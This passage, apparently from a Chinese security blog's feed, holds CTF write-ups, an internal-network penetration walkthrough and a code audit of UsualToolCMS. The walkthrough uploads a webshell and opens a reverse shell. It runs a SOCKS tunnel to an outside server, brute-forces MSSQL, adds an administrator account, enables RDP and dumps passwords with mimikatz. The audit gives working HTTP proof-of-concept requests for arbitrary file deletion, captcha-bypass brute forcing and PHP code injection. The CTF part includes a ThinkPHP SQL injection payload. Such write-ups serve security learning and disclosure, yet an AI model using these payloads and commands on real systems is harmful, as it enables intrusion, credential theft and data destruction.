url_get.status_code == 200:</span><br><span class="line">print(url_get.text)</span><br></pre></td></tr></table></figure><p>3.题目:初心不改<br><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/2370270929.png" alt="1975DE5B-D07B-4569-B8D0-E7171F2A034C.png"><br>访问页面发现是一个thinkphp5.0 一猜就是sql注入<br>一开始以为是构造一个注入然后load_file到flag后来发现想多了，直接通过payload拿到mysql账号密码<br><code>/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1</code><br><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/2511860583.png" alt="BA7D4195-9527-4B06-A1D8-28ABF453FE46.png"><br>主页查看源码发现有一个phpmyadmin，登陆后成功拿到flag<br><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/3803853201.png" alt="73F165EC-C956-40AD-9106-ADE323691340.png"></p><p>web题我是全部AK掉了有些题目是通过exp直接拿到flag太简单了就不讲了。<br><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/3180203719.png" alt="ADE2EF99-DEF7-46F4-AA7D-066EC4402E12.png"><br>Crypto题</p><hr><p>1.题目:震惊，凯撒竟被4人关在一密室</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">凯撒被4个人关在一个密室里！</span><br><span class="line">aCU3QjkxMjkxMTA3bjVnMTZoNjNjJTdEY2cwNDBoM2g4aTRlMDc3ZmYz</span><br></pre></td></tr></table></figure><p>先是base64<br><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/4195125983.png" alt="9B275494-53D5-4527-8A72-F5844E6A5CD8.png"><br>然后url编码<br><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/1834402293.png" alt="647F179F-6624-426A-924B-3538D10E806A.png"><br>栅栏编码四组<br><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/3756062370.png" alt="9D959343-EA85-4A6D-85A4-7D017E27DDE7.png"><br>凯撒拿到flag<br><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/2613812638.png" alt="9192AE6D-3539-4AC4-83FD-97E3D50A533A.png"></p><p>2.题目:粗心大意的主管<br>已知密文为:925♥♥♥A2D74♥♥DDE4♥EBC0♥♥♥1D0E♥♥7<br>原文为:8E5♥♥C14DCD♥CDE8♥♥55F3738♥11DE7A。<br>写个python就行了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import string</span><br><span class="line">import hashlib</span><br><span class="line">payloads = &apos;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&apos;</span><br><span class="line"></span><br><span class="line">for a in payloads:</span><br><span class="line">    for b in payloads:</span><br><span class="line">        for c in payloads:</span><br><span class="line">        for d in payloads:</span><br><span class="line">        for e in payloads:</span><br><span class="line">        for f in payloads:</span><br><span class="line">            s = &quot;8E5&quot;+a+d+&quot;C14DCD&quot;+b+&quot;CDE8&quot;+e+c+&quot;55F3738&quot;+f+&quot;11DE7A&quot;</span><br><span class="line">            tmp = hashlib.md5(s).hexdigest().upper()</span><br><span class="line">            if &apos;925&apos; in tmp and &apos;A2D74&apos; in tmp and &apos;DDE4&apos; in tmp and &apos;EBC0&apos; in tmp:</span><br><span class="line">                print(s)</span><br><span class="line">               print(tmp)</span><br></pre></td></tr></table></figure><p>3.题目:畸形的凯撒<br>密文：afZ_rCI[kA55#;ASc9*%$c</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">char=&quot;afZ_rCI[kA55#;ASc9*%$c&quot;</span><br><span class="line">i = 0</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">while i &lt; len(char):</span><br><span class="line">num = ord(char[i])+(i+5)</span><br><span class="line">flag+=chr(num)</span><br><span class="line">i+=1</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><p>1.题目:机密文件<br>用NET.Reflector Pro工具打开文件<br><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/2721756916.png" alt="6B517F8B-57C6-43CC-AD32-AF739244D967.png"><br>看到源代码<br>发现是aes加密使用openssl解密或者用c#再写一个解密的<br>password也在里面<br><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/3386985755.png" alt="27E2F10D-6444-4F29-A275-9BBA743B8386.png"><br><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/618023056.png" alt="593D7C75-0E7F-4421-A4C7-A572F8ED6572.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl aes-128-cbc -nosalt -d -in secret.636748579460890458.bin -iv 6b6a704853325367344c716637754e65 -K 6b6a704853325367344c716637754e65 -p</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!--markdown--&gt;web题
&lt;hr&gt;
&lt;p&gt;1.题目:小可爱&lt;br&gt;第一步肯定是绕过本地回环地址&lt;br&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110162152/42859380
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>CTF内网渗透题</title>
    <link href="https://vuln.top/2019/10/15/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    <id>https://vuln.top/2019/10/15/内网渗透/</id>
    <published>2019-10-15T02:20:22.000Z</published>
    <updated>2021-01-10T09:21:08.280Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>记一次CTF内网渗透，据说是从护网复现过来的。</p></blockquote><p><code>这是第一个flag。。。</code><br><a href="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/XYVLCT.png" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/XYVLCT.png" alt="a.md.png"></a><br>既然我们知道这是wordpress正常套路那我们通过<code>wpscan</code>扫描一下</p><hr><p>如下图发现存在xmlrpc.php，根据经验这个php存在用户密码爆破，那我们尝试一下<br>参考：<a href="https://medium.com/@the.bilal.rizwan/wordpress-xmlrpc-php-common-vulnerabilites-how-to-exploit-them-d8d3c8600b32" target="_blank" rel="noopener">Wordpress xmlrpc.php -common vulnerabilites &amp; how to exploit them</a><br><a href="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/YygAkD.png" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/YygAkD.png" alt="QQ20191012000758.png"></a></p><p>通过文章发布的地方知道存在一个power_admin的用户<br><a href="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/4jKvvY.png" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/4jKvvY.png" alt="SWYT13G1LF0YTM8V3M9A.png"></a><br>通过<code>xmlrpc.php</code>验证一下<br><a href="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/ZpUhR0.png" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/ZpUhR0.png" alt="HFT3U203JYN_0GXU0X7.md.png"></a><br>不知道为什么是不是我个人问题输入正确账号密码后没有直接给我跳转到wp-admin/index.php页面还是在原来页面。我只能通过替换cookie后直接访问。<br><a href="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/hwSKJa.png" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/hwSKJa.png" alt="NC85I4XP14RYQZOMYHK.md.png"></a><br>在媒体库内直接上传冰蝎一句话后访问正常操作<br><a href="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/olvWei.png" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/olvWei.png" alt="9219XMTIHPMKF937Y.png"></a><br>之后通过冰蝎配合msf反弹shell<br><a href="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/Tn6BvB.png" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/Tn6BvB.png" alt="1E42VR__1LT_7UMYS6E.png"></a></p><p>内网穿透我比较常用的手法是通过ew配合proxychains<br><a href="https://zhuanlan.zhihu.com/p/32822159" target="_blank" rel="noopener">如何通过EW做Socks5代理进行内网渗透 - 知乎</a><br>ew for linux下载地址：<a href="http://118.126.66.150/ew_for_linux64" target="_blank" rel="noopener">ew</a></p><hr><p>首先在公网的vps上通过ew监听1080和1024<br><code>./ew_for_linux64 -s rcsocks -l 1080 -e 1024 &amp;</code><br>之后通过msf把ew客户端上传到靶机上</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; upload /root/ew/ew_for_linux64 /tmp/</span><br><span class="line">[*] uploading  : /root/ew/ew_for_linux64 -&gt; /tmp/</span><br><span class="line">[*] uploaded   : /root/ew/ew_for_linux64 -&gt; /tmp//ew_for_linux64</span><br><span class="line">meterpreter &gt; </span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 20657 created.</span><br><span class="line">Channel 0 created.</span><br><span class="line">cd /tmp</span><br><span class="line">chmod 777 ew_for_linux64</span><br><span class="line">./ew_for_linux64 -s rssocks -d 118.126.66.150 -e 1024</span><br></pre></td></tr></table></figure><p>在配置一下本地kali的proxychains<br>编辑<code>/etc/proxychains.conf</code>,在最下面一行修改为公网vps的地址和端口<br><a href="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/T1FNkx.png" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/T1FNkx.png" alt="K5Y013PSU5M83UBVBXPV.png"></a><br>正确配置后就可愉快的探索内网了，如下图通过<code>proxychains nmap -sT 192.168.1.2 -Pn</code>扫描1.2主机的端口，这里我就不扫描内网了可以通过msf的模块扫描，我这里直接通过webshell尝试ping邻居的IP来获取主机（注意icmp协议是无法通过proxychains传递的）。<br><a href="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/5wFub4.png" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/5wFub4.png" alt="3ZNZLFWSSM47GFEU2O.png"></a><br>发现存在1433端口通过hydra爆破密码，我前面已经爆破过了所以知道密码是123456演示一下，hydra命令我就不解释了看下help文档就会了。<br><a href="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/GJuZ6d.png" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/GJuZ6d.png" alt="0W970XQWF9T7WQWXJGN2E.md.png"></a><br>通过<code>proxychains msfconsole</code>使用<code>use auxiliary/admin/mssql/mssql_exec</code>模块执行命令<br><a href="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/KMudsD.png" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/KMudsD.png" alt="QQ20191012010458.png"></a><br>添加账户设置管理员，开启3389</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net user 1111 abc.123 /add</span><br><span class="line">net localgroup administrators 1111 /add</span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure><p><a href="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/hZFi47.png" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/hZFi47.png" alt="NY5_FWI1V_B79CBEDMU.png"></a><br>现在可以通过rdesktop直接访问<br><a href="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/Bb1WIQ.png" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/Bb1WIQ.png" alt="HTE8Q1ILEEY59JQ0_V2.png"></a><br>上传神奇mimikz！！获取管理员密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><p><a href="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/eb6d61.png" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/eb6d61.png" alt="BKJXCL2EW5SSLEMFR.png"></a></p><p><a href="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/3xtF0N.png" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/3xtF0N.png" alt="YWY4ZGBZMJEAMOVV7O.png"></a></p><p>还有一台主机通过密码flag3{xxxx}账号administrator直接远程桌面连接即可</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;记一次CTF内网渗透，据说是从护网复现过来的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;code&gt;这是第一个flag。。。&lt;/code&gt;&lt;br&gt;&lt;a href=&quot;https://cdn.jsdelivr.net/gh/H1dery/H1dery
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>自己整理的信息收集1.0思维导图</title>
    <link href="https://vuln.top/2019/09/09/pentest/"/>
    <id>https://vuln.top/2019/09/09/pentest/</id>
    <published>2019-09-09T15:09:02.000Z</published>
    <updated>2019-09-09T15:40:40.680Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://vuln.top/2019/09/09/pentest/pentest.png" alt="信息收集"></p><p>最近花了一会整理的信息收集1.0，有些详细的内容还不是很全。用来给我自己当作一个备忘录年纪大了记性不好,有时间的话会持续更新。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;https://vuln.top/2019/09/09/pentest/pentest.png&quot; alt=&quot;信息收集&quot;&gt;&lt;/p&gt;
&lt;p&gt;最近花了一会整理的信息收集1.0，有些详细的内容还不是很全。用来给我自己当作一个备忘录年纪大了记性不好,有时间的话会持
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Uscms代码审计</title>
    <link href="https://vuln.top/2019/07/18/80/"/>
    <id>https://vuln.top/2019/07/18/80/</id>
    <published>2019-07-18T15:23:42.000Z</published>
    <updated>2021-01-10T10:00:42.580Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-第一处：前台任意文件删除"><a href="#0x01-第一处：前台任意文件删除" class="headerlink" title="0x01 第一处：前台任意文件删除"></a>0x01 第一处：前台任意文件删除</h1><p>漏洞信息：前台myup.php文件最后一段存在任意文件删除<br>代码：</p><p>漏洞点：<a href="http://xxx/myup.php" target="_blank" rel="noopener">http://xxx/myup.php</a></p><p><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/uscmsimg/1.png" alt="1"></p><p>第47行只对<code>..</code>做了过滤,我仍然能任意删除网站内的文件，直接构造poc,</p><p><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/uscmsimg/2.png" alt="2"></p><p><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/uscmsimg/3.png" alt="3"></p><p>Burp POC：</p><p><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/uscmsimg/4.png" alt="4"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /UsualToolCMS/myup.php HTTP/1.1</span><br><span class="line">Host: 192.168.235.242</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">X-Forwarded-For: 8.8.8.8</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 25</span><br><span class="line"></span><br><span class="line">get=delimg&amp;imgurl=./1.php</span><br></pre></td></tr></table></figure><h1 id="0x02-绕过后台验证码爆破"><a href="#0x02-绕过后台验证码爆破" class="headerlink" title="0x02 绕过后台验证码爆破"></a>0x02 绕过后台验证码爆破</h1><p>漏洞点:<a href="http://xxx.xxx.xxx.xxx/cmsadmin/" target="_blank" rel="noopener">http://xxx.xxx.xxx.xxx/cmsadmin/</a><br>后台登陆时默认需要输入验证码，但是当我把验证码的参数ucode删除时，登陆依然成功</p><p>1.默认情况下登陆数据包</p><p><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/uscmsimg/2-1.png" alt="2-1"></p><p><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/uscmsimg/2-2.png" alt="2-2"></p><p>删除ucode参数和cookie后登陆，直接登陆成功</p><p><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/uscmsimg/2-3.png" alt="2-3"></p><p>通过burp爆破后台密码</p><p><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/uscmsimg/2-4.png" alt="2-4"></p><p><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/uscmsimg/2-5.png" alt="2-5"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /UsualToolCMS/cmsadmin/a_login.php?do=login HTTP/1.1</span><br><span class="line">Host: 192.168.235.242</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Referer: http://192.168.235.242/UsualToolCMS/cmsadmin/a_login.php</span><br><span class="line">X-Forwarded-For: 8.8.8.8</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 23</span><br><span class="line"></span><br><span class="line">uuser=admin&amp;upass=admin</span><br></pre></td></tr></table></figure><h1 id="0x03-后台GETSHELL"><a href="#0x03-后台GETSHELL" class="headerlink" title="0x03  后台GETSHELL"></a>0x03  后台GETSHELL</h1><p>漏洞点:<a href="http://xxx.xxx.xxx.xxx/cmsadmin/a_lang.php" target="_blank" rel="noopener">http://xxx.xxx.xxx.xxx/cmsadmin/a_lang.php</a><br>13行未对$lg做判断</p><p><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/uscmsimg/3-1.png" alt="3-1"></p><p><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/uscmsimg/3-2.png" alt="3-2"></p><p><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/uscmsimg/3-3.png" alt="3-3"></p><p>点击保存时抓包需要修改url处的lg参数这样就上传到跟目录了，再在post 参数的en后面加入<code>en&quot;},&lt;?php phpinfo(); ?&gt;</code></p><p><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/uscmsimg/3-4.png" alt="3-4"></p><p><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/uscmsimg/3-5.png" alt="3-5"></p><p><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/uscmsimg/3-6.png" alt="3-6"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /UsualToolCMS/cmsadmin/a_langx.php?x=m&amp;lg=../1.php HTTP/1.1</span><br><span class="line">Host: 192.168.235.242</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Referer: http://192.168.235.242/UsualToolCMS/cmsadmin/a_langx.php?lg=lg-en.json</span><br><span class="line">Cookie: navleft=21; UTCMSLanguage=zh; PHPSESSID=1r5kk3jieflfbnseav3e5dnclo</span><br><span class="line">X-Forwarded-For: 8.8.8.8</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 9189</span><br><span class="line"></span><br><span class="line">submit=%E4%BF%9D%E5%AD%98%E8%AF%AD%E8%A8%80%E5%8C%85&amp;keys%5B%5D=language&amp;values%5B%5D=en&quot;&#125;,&lt;?php phpinfo(); ?&gt;&amp;keys%5B%5D=charset&amp;values%5B%5D=utf-8&amp;keys%5B%5D=speak&amp;values%5B%5D=English&amp;keys%5B%5D=web&amp;values%5B%5D=UsualToolCMS&amp;key%5B%5D=index&amp;value%5B%5D=Home&amp;key%5B%5D=article&amp;value%5B%5D=Article&amp;key%5B%5D=product&amp;value%5B%5D=Product&amp;key%5B%5D=picture&amp;value%5B%5D=Picture&amp;key%5B%5D=atlas&amp;value%5B%5D=Atlas&amp;key%5B%5D=contact&amp;value%5B%5D=Contact&amp;key%5B%5D=about&amp;value%5B%5D=About&amp;key%5B%5D=forum&amp;value%5B%5D=Forum&amp;key%5B%5D=register&amp;value%5B%5D=Register&amp;key%5B%5D=login&amp;value%5B%5D=Login&amp;key%5B%5D=news&amp;value%5B%5D=News&amp;key%5B%5D=job&amp;value%5B%5D=Job&amp;key%5B%5D=wages&amp;value%5B%5D=Wages&amp;key%5B%5D=application&amp;value%5B%5D=Application&amp;key%5B%5D=resume&amp;value%5B%5D=Resume&amp;key%5B%5D=shopcart&amp;value%5B%5D=Shopcart&amp;key%5B%5D=account&amp;value%5B%5D=Account&amp;key%5B%5D=member&amp;value%5B%5D=Member&amp;key%5B%5D=up&amp;value%5B%5D=Up&amp;key%5B%5D=down&amp;value%5B%5D=Down&amp;key%5B%5D=more&amp;value%5B%5D=More&amp;key%5B%5D=new&amp;value%5B%5D=New&amp;key%5B%5D=authorize&amp;value%5B%5D=Authorize&amp;key%5B%5D=authenticating&amp;value%5B%5D=Authenticating&amp;key%5B%5D=qq&amp;value%5B%5D=QQ&amp;key%5B%5D=membercenter&amp;value%5B%5D=Member&amp;key%5B%5D=username&amp;value%5B%5D=Username&amp;key%5B%5D=password&amp;value%5B%5D=Password&amp;key%5B%5D=forgotpass&amp;value%5B%5D=Forgot&amp;key%5B%5D=search&amp;value%5B%5D=Search&amp;key%5B%5D=detail&amp;value%5B%5D=Detail&amp;key%5B%5D=size&amp;value%5B%5D=Size&amp;key%5B%5D=spec&amp;value%5B%5D=Spec&amp;key%5B%5D=color&amp;value%5B%5D=Color&amp;key%5B%5D=aboutus&amp;value%5B%5D=About+Us&amp;key%5B%5D=newgoods&amp;value%5B%5D=New+Product&amp;key%5B%5D=topgoods&amp;value%5B%5D=Top+Product&amp;key%5B%5D=link&amp;value%5B%5D=Link&amp;key%5B%5D=confirm&amp;value%5B%5D=Confirm&amp;key%5B%5D=email&amp;value%5B%5D=Email&amp;key%5B%5D=title&amp;value%5B%5D=Title&amp;key%5B%5D=content&amp;value%5B%5D=Content&amp;key%5B%5D=avatar&amp;value%5B%5D=Avatar&amp;key%5B%5D=sex&amp;value%5B%5D=Sex&amp;key%5B%5D=man&amp;value%5B%5D=Man&amp;key%5B%5D=woman&amp;value%5B%5D=Woman&amp;key%5B%5D=address&amp;value%5B%5D=ADD.&amp;key%5B%5D=tel&amp;value%5B%5D=Tel&amp;key%5B%5D=fax&amp;value%5B%5D=Fax&amp;key%5B%5D=introduction&amp;value%5B%5D=Intro&amp;key%5B%5D=validatecode&amp;value%5B%5D=Captcha&amp;key%5B%5D=changeit&amp;value%5B%5D=Change+it&amp;key%5B%5D=order&amp;value%5B%5D=Order&amp;key%5B%5D=writeorder&amp;value%5B%5D=Write+Order&amp;key%5B%5D=menu&amp;value%5B%5D=Menu&amp;key%5B%5D=balance&amp;value%5B%5D=Balance&amp;key%5B%5D=level&amp;value%5B%5D=Level&amp;key%5B%5D=writearticles&amp;value%5B%5D=Write+Articles&amp;key%5B%5D=articlemanagement&amp;value%5B%5D=Article+Admin&amp;key%5B%5D=articlebrowse&amp;value%5B%5D=Article+Browse&amp;key%5B%5D=writeonline&amp;value%5B%5D=Add+New&amp;key%5B%5D=payment&amp;value%5B%5D=Payment&amp;key%5B%5D=registrationtime&amp;value%5B%5D=Reg+Time&amp;key%5B%5D=lastlogintime&amp;value%5B%5D=Last+Login&amp;key%5B%5D=fullname&amp;value%5B%5D=Full+Name&amp;key%5B%5D=privileges%3Adiscount&amp;value%5B%5D=Privileges%3ADiscount&amp;key%5B%5D=state&amp;value%5B%5D=State&amp;key%5B%5D=source&amp;value%5B%5D=Source&amp;key%5B%5D=ordernumber&amp;value%5B%5D=Order+No.&amp;key%5B%5D=money&amp;value%5B%5D=Money&amp;key%5B%5D=time&amp;value%5B%5D=Time&amp;key%5B%5D=finish&amp;value%5B%5D=Finish&amp;key%5B%5D=unpaid&amp;value%5B%5D=Unpaid&amp;key%5B%5D=deliver&amp;value%5B%5D=Deliver&amp;key%5B%5D=refund&amp;value%5B%5D=Refund&amp;key%5B%5D=goods&amp;value%5B%5D=Goods&amp;key%5B%5D=charge&amp;value%5B%5D=Charge&amp;key%5B%5D=other&amp;value%5B%5D=Other&amp;key%5B%5D=ordertime&amp;value%5B%5D=Order+Time&amp;key%5B%5D=voucher&amp;value%5B%5D=Voucher&amp;key%5B%5D=customer&amp;value%5B%5D=Customer&amp;key%5B%5D=zipcode&amp;value%5B%5D=Zip+Code&amp;key%5B%5D=logistics&amp;value%5B%5D=Logistics&amp;key%5B%5D=logisticscompany&amp;value%5B%5D=Company&amp;key%5B%5D=logisticsnumber&amp;value%5B%5D=Number&amp;key%5B%5D=logisticsdetails&amp;value%5B%5D=Details&amp;key%5B%5D=paymentmethod&amp;value%5B%5D=Method&amp;key%5B%5D=alipay&amp;value%5B%5D=Alipay&amp;key%5B%5D=wechatpay&amp;value%5B%5D=Tencent+Wechat&amp;key%5B%5D=paypal&amp;value%5B%5D=Paypal&amp;key%5B%5D=waitinganswer&amp;value%5B%5D=Waiting&amp;key%5B%5D=answered&amp;value%5B%5D=Answered&amp;key%5B%5D=question&amp;value%5B%5D=Question&amp;key%5B%5D=reply&amp;value%5B%5D=Reply&amp;key%5B%5D=tencentaccount&amp;value%5B%5D=Tencent&amp;key%5B%5D=weiboaccount&amp;value%5B%5D=Weibo&amp;key%5B%5D=wechataccount&amp;value%5B%5D=Wechat&amp;key%5B%5D=binded&amp;value%5B%5D=Binded&amp;key%5B%5D=untie&amp;value%5B%5D=Untie&amp;key%5B%5D=quantity&amp;value%5B%5D=Qty&amp;key%5B%5D=parameter&amp;value%5B%5D=Parm&amp;key%5B%5D=total&amp;value%5B%5D=Total&amp;key%5B%5D=submit&amp;value%5B%5D=Submit&amp;key%5B%5D=delete&amp;value%5B%5D=Del&amp;key%5B%5D=unit&amp;value%5B%5D=USD&amp;key%5B%5D=actual&amp;value%5B%5D=Actual&amp;key%5B%5D=feedback&amp;value%5B%5D=Feedback&amp;key%5B%5D=otheraccount&amp;value%5B%5D=O